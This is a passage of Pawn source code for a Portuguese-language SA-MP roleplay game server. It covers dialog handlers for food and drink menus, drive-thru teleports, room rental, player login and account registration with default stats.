					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Brigadeiro");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+15);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 6://Mousse
				{
					if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$3 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -3);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Mousse");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+17);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 7://Quindim
				{
					if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$3 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -3);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Quindim");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+17);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 8://Pavê
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$4 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -4);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Pavê");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+25);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 9:
				{
					ShowPlayerDialog(playerid, DriveThru, DIALOG_STYLE_LIST, "Cardápio - DriveThru","- Bebida\n\n- Lanche\n\n- Sobremesa", "Comprar", "Cancelar");
					return 1;
				}
			}
		}*/
		if(dialogid == DVS)
		{
			if(!response) { return 1; }
			switch(listitem)
			{
				case 0://LS
				{
					SetPlayerPos(playerid, 2401.9275,-1506.4696,23.3550);
					SendClientMessage(playerid, 0x1E90FFFF,"Você foi para o DriveThru de {FFFFFF}LS");
				}
				case 1://LS[2]
				{
					SetPlayerPos(playerid, 800.5552,-1629.6398,12.9030);
					SendClientMessage(playerid, 0x1E90FFFF,"Você foi para o Drive Thru de{FFFFFF}LS[2]");
				}
				case 2://LS[3]
				{
					SetPlayerPos(playerid, 1179.7521,-902.8798,42.8330);
					SendClientMessage(playerid, 0x1E90FFFF,"Você foi para o DriveThru de{FFFFFF}LS[3]");
				}
				case 3://SF
				{
					SetPlayerPos(playerid, -2350.0037,-155.5846,34.8405);
					SendClientMessage(playerid, 0x1E90FFFF,"Você foi para o DriveThru de{FFFFFF}SF");
				}
				case 4://LV
				{
					SetPlayerPos(playerid, 1857.3107,2081.2676,10.3387);
					SendClientMessage(playerid, 0x1E90FFFF,"Você foi para o DriveThru de{FFFFFF}LV");
				}
				case 5://LV[2]
				{
					SetPlayerPos(playerid, 2486.0686,2022.3807,10.3402);
					SendClientMessage(playerid, 0x1E90FFFF,"Você foi para o DriveThru de{FFFFFF}LV[2]");
				}
			}
		}
	}
//------------------------------ DriveThru -------------------------------------
//---------------------------- FomeSedeSono ------------------------------------
	if(dialogid == D_CARDAPIO)
	{

		if(!response) { return 1; }
		switch(listitem)
		{

			case 0://Bebida
			{
	    		ShowPlayerDialog(playerid, D_BEBS1, DIALOG_STYLE_LIST, "Bebidas",
				"Agua - {3DB134}R$3,00\nCoca-Cola - {3DB134}R$5,00\nGuaraná - {3DB134}R$4,00\nSuco de Laranja - {3DB134}R$4,00\nSuco de Maracuja - {3DB134}R$4,00", "Comprar", "Voltar");
			}
			case 1://Bebidas Alcoolicas
			{
	    		ShowPlayerDialog(playerid, D_BEBSAL2, DIALOG_STYLE_LIST, "Bebidas Alcoólicas",
				"Vodka - {3DB134}R$79,00\nBig Apple - {3DB134}R$29,00\nVinho - {3DB134}R$20,00\nSminorff - {3DB134}R$14,00\nCerveja - {3DB134}R$4,00", "Comprar", "Voltar");
			}
			case 2://Comida
			{
	    		ShowPlayerDialog(playerid, D_CMDA3, DIALOG_STYLE_LIST, "Comidas",
				"Marmitex - {3DB134}R$10,00\nMacarrão - {3DB134}R$8,00\nFeijoada - {3DB134}R$12,00\nArroz carreteiro - {3DB134}R$9,00\nChurrasco - {3DB134}R$20,00", "Comprar", "Voltar");
			}
			case 3://Lanche
			{
	    		ShowPlayerDialog(playerid, D_LCHS4, DIALOG_STYLE_LIST, "Lanches",
				"Beirute - {3DB134}R$13,00\nX-Salada - {3DB134}R$8,00\nEsfirra - {3DB134}R$5,00\nPastel - {3DB134}R$4,00\nCoxinha - {3DB134}R$3,00", "Comprar", "Voltar");
			}
		}
	}
	if(dialogid == D_BEBS1)
	{
		if(!response) { return 1; }
		switch(listitem)
		{
			case 0://Agua
			{

				if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$3 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -3);
				SendClientMessage(playerid,COR_VERDECLARO,"Você acabou de beber 'Água'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			}
			case 1://Coca Cola
			{

				if(GetPlayerCash(playerid) < 5) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$5 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -5);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Coca-Cola'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			}
			case 2://Guaraná
			{

				if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$4 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -4);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Guaraná'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+80);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			}
			case 3://Suco de Laranja
			{

				if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$4 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid,-4);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Suco de Laranja'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+80);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
            }
			case 4://Suco de Laranja
			{

				if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$4 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid,-4);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Suco de Laranja'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+80);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
            }
		    case 5:
			{
	      		ShowPlayerDialog(playerid, D_CARDAPIO, DIALOG_STYLE_LIST, "Cardápio - Lanchonete","- Bebidas\n\n- Bebidas Alcoólica\n\n- Comidas\n\n- Lanches\n", "Comprar", "Cancelar");
	            return 1;
   			}
		}
	}
	if(dialogid == D_BEBSAL2)
	{
		if(!response) { return 1; }
		switch(listitem)
		{
			case 0://Vodka
			{

				if(GetPlayerCash(playerid) < 79) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$79 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				ApplyAnimation(playerid,"PED", "WALK_DRUNK", 4.0, 1, 1, 1, 1, 1);
				GivePlayerCash(playerid, -79);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Vodka'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			}
			case 1://Big Apple
			{

				if(GetPlayerCash(playerid) < 29) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$29 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				ApplyAnimation(playerid,"PED", "WALK_DRUNK", 4.0, 1, 1, 1, 1, 1);
				GivePlayerCash(playerid, -29);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Big Apple'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			}
			case 2://Vinho
			{

				if(GetPlayerCash(playerid) < 20) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$20 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				ApplyAnimation(playerid,"PED", "WALK_DRUNK", 4.0, 1, 1, 1, 1, 1);
				GivePlayerCash(playerid, -20);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Vinho'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			}
			case 3://Sminorff
			{

				if(GetPlayerCash(playerid) < 14) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$14 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				ApplyAnimation(playerid,"PED", "WALK_DRUNK", 4.0, 1, 1, 1, 1, 1);
				GivePlayerCash(playerid,-14);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Sminorffa'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
            }
			case 4://Cerveja
			{

				if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$4 para comprar!");
				if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
				ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				ApplyAnimation(playerid,"PED", "WALK_DRUNK", 4.0, 1, 1, 1, 1, 1);
				GivePlayerCash(playerid,-4);
				SendClientMessage(playerid,0x0D85B5FF,"Você acabou de beber 'Cerveja'");
				SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+70);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
            }
		    case 5:
			{
	      		ShowPlayerDialog(playerid, D_CARDAPIO, DIALOG_STYLE_LIST, "Cardápio - Lanchonete","- Bebidas\n\n- Bebidas Alcoólica\n\n- Comidas\n\n- Lanches\n", "Comprar", "Cancelar");
	            return 1;
   			}
		}
	}
	if(dialogid == D_CMDA3)
	{

		if(!response) { return 1; }
		switch(listitem)
		{

			case 0://Marmitex
			{

				if(GetPlayerCash(playerid) < 10) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$10 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -10);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Marmitex'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+70);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 1://Macarrão
			{

				if(GetPlayerCash(playerid) < 8) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$8 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -8);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Macarrão'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+60);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 2://Feijoada
			{

				if(GetPlayerCash(playerid) < 12) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$12 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -12);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Feijoada'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 3://Arroz carreteiro
			{

				if(GetPlayerCash(playerid) < 9) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$9 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid,"FOOD","EAT_Pizza",4.1,0,1,1,1,1);
				GivePlayerCash(playerid, -9);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Arroz carreteiro'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+65);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 4://Churrasco
			{

				if(GetPlayerCash(playerid) < 20) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$20 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -20);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Churrasco'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+100);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
		    case 5:
			{
	      		ShowPlayerDialog(playerid, D_CARDAPIO, DIALOG_STYLE_LIST, "Cardápio - Lanchonete","- Bebidas\n\n- Bebidas Alcoólica\n\n- Comidas\n\n- Lanches\n", "Comprar", "Cancelar");
	            return 1;
   			}
		}
	}
	if(dialogid == D_LCHS4)
	{

		if(!response) { return 1; }
		switch(listitem)
		{

			case 0://Beirute
			{

				if(GetPlayerCash(playerid) < 13) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$13 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -13);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Beirute'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+100);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 1://X-Salada
			{

				if(GetPlayerCash(playerid) < 8) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$8 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -8);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'X-Salada'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 2://Esfirra
			{

				if(GetPlayerCash(playerid) < 5) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$5 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -5);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Esfirra'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+70);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 3://Pastel
			{

				if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$4 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -4);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Pastel'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+65);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
			case 4://Coxinha
			{

				if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xF68E00F6,"{FF0000}{FFFFFF}Você não tem R$3 para comprar!");
				if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
				GivePlayerCash(playerid, -3);
				SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de 'Coxinha'");
				SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+60);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
			}
		    case 5:
			{
	      		ShowPlayerDialog(playerid, D_CARDAPIO, DIALOG_STYLE_LIST, "Cardápio - Lanchonete","- Bebidas\n\n- Bebidas Alcoólica\n\n- Comidas\n\n- Lanches\n", "Comprar", "Cancelar");
	            return 1;
   			}
		}
	}
	if(dialogid == D_TEST)
	{

		if(response)
		{
			if(Alugou[playerid] == true) return SendClientMessage(playerid, -1,"Você já alugou um quarto.");
            if(GetPlayerCash(playerid) < 370) return SendClientMessage(playerid, -1,"Você não tem R$370 para alugar!");
            if(GetPVarInt(playerid,"Sono") >= 75) return SendClientMessage(playerid,-1,"Você não esta com sono!");
            SendClientMessage(playerid, -1, "Para dormir use '/Dormir', em cima de sua cama!");
            new Random = random(sizeof(RandomSpawns));
            SetPlayerPos(playerid, RandomSpawns[Random][0], RandomSpawns[Random][1],RandomSpawns[Random][2]);
            GivePlayerCash(playerid, -370);
			Alugou[playerid] = true;
		}
	}
//----------------------------------- FSS --------------------------------------
    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
    format(hFile, sizeof(hFile), "Casas/casa%d.ini", WE_GetInt(gFile, "Casa"));

	new
		ano, mes, dia, hora, minuto, segundo
	;
	getdate(ano, mes, dia);
	gettime(hora, minuto, segundo);

	if(dialogid == D_LOGIN)
	{
		if(response)
		{
			if(!strlen(inputtext))
			{
				format(s5Doze, sizeof(s5Doze), "{FFFFFF}Bem-vindo(a) ao {FF1E1E}World {1E90FF}Evolution {FFF36E}RPG{FFFFFF}\n\nConta: %s\nStatus: {00FF00}Registrada{FFFFFF}\n\nVersão 1.0 - Não há notícias, fique atento ao fórum!\n* Insira sua senha abaixo para logar:", PlayerName(playerid));
				ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "{FFFFFF} {FFFFFF}World Evolution RPG{F90C14} 1.0", s5Doze, "Logar", "Cancelar");
				return 0;
			}
			if(fexist(gFile))
			{
			    new
					password = WE_GetInt(gFile, "Senha")
				;
		       	if(pass_hash(inputtext) != password)
				{
				    if(pInfo[playerid][psErrou] >= 2)
				    {
				        format(gStr, sizeof(gStr), "{FF0000}Você inseriu uma senha não compatível. Tente novamente.", pInfo[playerid][psErrou]);
                		SendClientMessage(playerid, COR_ERRO, gStr);
                		pInfo[playerid][psErrou] = 0;
				        SendClientMessage(playerid, VERMELHO_WE, "Você não inseriu a senha correta por 3 tentativas. {1E90FF}Visite o fórum e requisite uma nova senha!");
			    		SendClientMessage(playerid, AZUL_WE, "Acesse nosso fórum: forumwe.vivagamesonline.com");
			    		Kick(playerid);
						return 0;
					}
				    pInfo[playerid][psErrou] += 1;
				    format(gStr, sizeof(gStr), "{FF0000}Você inseriu uma senha não compatível. Tente novamente.", pInfo[playerid][psErrou]);
                	SendClientMessage(playerid, COR_ERRO, gStr);
					format(s5Doze, sizeof(s5Doze), "{FFFFFF}Bem-vindo(a) ao {FF1E1E}World {1E90FF}Evolution {FFF36E}RPG{FFFFFF}\n\nConta: %s\nStatus: {00FF00}Registrada{FFFFFF}\n\nVersão 1.0 - Não há notícias, fique atento ao fórum!\n* Insira sua senha abaixo para logar:", PlayerName(playerid));
					ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "{FFFFFF} {FFFFFF}World Evolution RPG{F90C14} 1.0", s5Doze, "Logar", "Cancelar");
				}
				else
				{
					pInfo[playerid][Logado] = true;
					pInfo[playerid][NeedsOff] = false;
					ContagemFome[playerid] = SetTimerEx("Fome", 216000, true, "i", playerid);
					ContagemSede[playerid] = SetTimerEx("Sede", 80000, true, "i", playerid);
					ContagemSono[playerid] = SetTimerEx("Sono", 900000, true, "i", playerid);
					CarregarFile(playerid);
					ShowTextDrawStatus(playerid);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid, "Fome"));
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid, "Sede"));
					SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], GetPVarInt(playerid, "Sono"));
					SpawnPlayer(playerid);
					//SetTimerEx("AttDados",1800000,true,"i",playerid);
				}
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você cancelou o login e foi kickado!");
		    Kick(playerid);
		}
		return 1;
	}
  	if(dialogid == D_REGISTRO)
	{
		if(!response)
		{
			SendClientMessage(playerid, COR_ERRO, "Você cancelou o registro e foi kickado!");
		    Kick(playerid);
		    return 1;
		}
	    if(!strlen(inputtext) || strlen(inputtext) > 30)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Senha fora do padrão! (Mínimo de caracteres: {0000FF}3 - {FFFFFF}Máximo: {0000FF}30)");
			format(s5Doze, sizeof(s5Doze), "{FFFFFF}Bem-vindo(a) ao {FF1E1E}World {1E90FF}Evolution {FFF36E}RPG{FFFFFF}\n\nConta: %s\nStatus: {FF0000}Não registrada{FFFFFF}\n\nVersão 1.0 - Não há notícias, fique atento ao fórum!\n* Insira sua senha abaixo para registrar-se:\n> {FF0000}OBS: {FFFFFF}Por segurança, jamais compartilhe sua senha!", PlayerName(playerid));
			ShowPlayerDialog(playerid, D_REGISTRO, DIALOG_STYLE_PASSWORD, "{FFFFFF} {FFFFFF}World Evolution RPG{F90C14} 1.0", s5Doze, "Registrar", "Cancelar");
			return 0;
		}
		if(!fexist(gFile))
		{
		    WE_CreateFile(gFile);
		    WE_SetInt(gFile, "Senha", pass_hash(inputtext));
		    WE_SetString(gFile, "Email", "WE");
			WE_SetInt(gFile, "Dinheiro", 500);
			WE_SetInt(gFile, "ContaBanco", 0);
			WE_SetInt(gFile, "SaldoBanco", 0);
			WE_SetInt(gFile, "Profissao", DESEMPREGADO);
			WE_SetInt(gFile, "Skin", 137);
			WE_SetInt(gFile, "Sexo", -1);
			WE_SetInt(gFile, "Exp", 0);
			WE_SetInt(gFile, "Level", 0);
			WE_SetInt(gFile, "SegUP", 59);
			WE_SetInt(gFile, "MinUP", 9);
			WE_SetInt(gFile, "AdminL", 0);
			WE_SetInt(gFile, "Gasolina", 50);
			WE_SetInt(gFile, "HabTCarro", 0);
			WE_SetInt(gFile, "HabTMoto", 0);
			WE_SetInt(gFile, "HabTCaminhao", 0);
			WE_SetInt(gFile, "HabTTrem", 0);
			WE_SetInt(gFile, "HabNBarco", 0);
			WE_SetInt(gFile, "HabAHeli", 0);
			WE_SetInt(gFile, "HabAAviao", 0);
			WE_SetInt(gFile, "HabP", 0);
			WE_SetInt(gFile, "Spawn", 0);
			WE_SetInt(gFile, "Luta", FIGHT_STYLE_NORMAL);
			WE_SetInt(gFile, "Procurado", 0);
			WE_SetInt(gFile, "Preso", 0);
			WE_SetInt(gFile, "Casa", -1);
			WE_SetInt(gFile, "T_Cocaina", 0);
			WE_SetInt(gFile, "T_Maconha", 0);
			WE_SetInt(gFile, "T_Crack", 0);
			WE_SetInt(gFile, "P_Cocaina", 0);
			WE_SetInt(gFile, "P_Maconha", 0);
			WE_SetInt(gFile, "P_Crack", 0);
			WE_SetInt(gFile, "Fotos", 0);
			WE_SetInt(gFile, "Caca", 0);
			WE_SetInt(gFile, "Peixes", 0);
			WE_SetInt(gFile, "Tem_GPS", 0);
			WE_SetInt(gFile, "Tem_RelogioUP", 1);
			WE_SetInt(gFile, "RelogioONOFF", 1);
    		WE_SetInt(gFile, "Tem_Velocimetro", 1);
    		WE_SetInt(gFile, "Velo_ON_OFF", 1);
    		WE_SetInt(gFile, "Tem_Cura", 0);
	   		WE_SetInt(gFile, "Kit", 0);
 			WE_SetInt(gFile, "Administrador", 0);
 			WE_SetInt(gFile, "Moderador", 0);
 			WE_SetInt(gFile, "Ajudante", 0);
 			WE_SetInt(gFile, "Corregedor", 0);
 			WE_SetInt(gFile, "Banido", 0);
 			WE_SetInt(gFile, "Tem_Capact", 0);
 			WE_SetInt(gFile, "MorandoID", -1);
 			WE_SetInt(gFile, "Seguro", 0);
 			WE_SetInt(gFile, "Convenio", 0);
 			WE_SetInt(gFile, "Lider", 0);
 			WE_SetInt(gFile, "SubLider", 0);
 			WE_SetInt(gFile, "Membro", 0);
 			WE_SetFloat(gFile, "Vida", 100.0);
 			WE_SetInt(gFile, "Registrado", 0);
			WE_SetString(gFile, "CasadoCom", "Ninguém");
			WE_SetInt(gFile, "Casado", 0);
